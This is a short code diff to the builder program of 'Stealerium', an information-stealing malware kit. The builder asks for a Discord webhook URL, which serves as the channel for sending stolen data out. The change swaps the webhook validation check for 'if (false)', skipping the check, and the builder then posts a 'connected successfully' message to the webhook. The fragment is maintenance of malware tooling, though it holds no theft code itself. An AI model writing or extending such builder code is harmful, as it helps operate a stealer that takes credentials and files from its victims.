@@ -13,7 +13,7 @@ internal class Program
         // Settings
         var token = Cli.GetStringValue("Discord webhook url");
         // Test connection to Discord webhook url
-        if (!await Discord.WebhookIsValidAsync(token))
+        if (false)
                 Cli.ShowError("Check the webhook url!");
         else
             await Discord.SendMessageAsync("✅ *Stealerium* builder connected successfully!", token);
